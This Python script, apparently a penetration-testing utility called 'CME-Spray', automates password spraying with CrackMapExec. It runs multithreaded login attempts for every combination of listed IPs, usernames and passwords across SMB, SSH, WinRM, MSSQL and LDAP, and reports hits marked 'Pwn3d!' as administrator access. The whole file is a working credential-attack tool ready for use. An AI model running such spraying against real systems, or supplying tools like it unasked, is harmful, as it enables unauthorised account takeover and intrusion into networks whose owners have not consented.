from termcolor import colored
import argparse
import subprocess
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

parser = argparse.ArgumentParser(description='CME-Spray - Password spray using CrackMapExec')
parser.add_argument('--ips', required=True, help='Path to the file containing IP addresses or a single IP address.')
parser.add_argument('--users', required=True, help='Path to the file containing usernames or a single username.')
parser.add_argument('--passwords', required=True, help='Path to the file containing passwords or a single password.')
parser.add_argument('--services', nargs='+', default=["smb", "ssh", "winrm", "mssql", "ldap"],
                    help='List of services to spray. Default is all supported services.')
parser.add_argument('--print-success', action='store_true', help='Print only successful connections.')
parser.add_argument('--threads', type=int, default=10, help='Number of threads to use for password spraying.')
args = parser.parse_args()


def read_input(input_path):
    if os.path.isfile(input_path):
        with open(input_path, 'r') as file:
            return [line.strip() for line in file.readlines()]
    else:
        return [input_path]


ip_addresses = read_input(args.ips)
usernames = read_input(args.users)
passwords = read_input(args.passwords)


def spray_password(ip, service, username, password):
    try:
        command = ["crackmapexec", service, ip, "-u", username, "-p", password]
        result = subprocess.run(command, capture_output=True, text=True, timeout=30)
        if "Pwn3d!" in result.stdout:
            if args.print_success:
                return colored(f"[+] Success on {service}://{ip} with {username}:{password}\n{result.stdout}", 'green')
            else:
                return colored(f"[*] Attempt on {service}://{ip} with {username}:{password}\n{result.stdout}", 'blue')
        else:
            return colored(f"[-] No success on {service}://{ip} with {username}:{password}", 'yellow')
    except subprocess.TimeoutExpired:
        return colored(f"[-] Timeout expired for {service}://{ip} with {username}:{password}", 'red')
    except Exception as e:
        return colored(f"[-] Error for {service}://{ip} with {username}:{password}: {str(e)}", 'red')


def main():
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_params = {
            executor.submit(spray_password, ip, service, username, password): (ip, service, username, password)
            for service in args.services
            for ip in ip_addresses
            for username in usernames
            for password in passwords}

        for future in as_completed(future_to_params):
            ip, service, username, password = future_to_params[future]
            try:
                result = future.result()
                print(result)
            except Exception as exc:
                print(
                    colored(f"[-] Generating exception for {service}://{ip} with {username}:{password}: {exc}", 'red'))


if __name__ == "__main__":
    main()
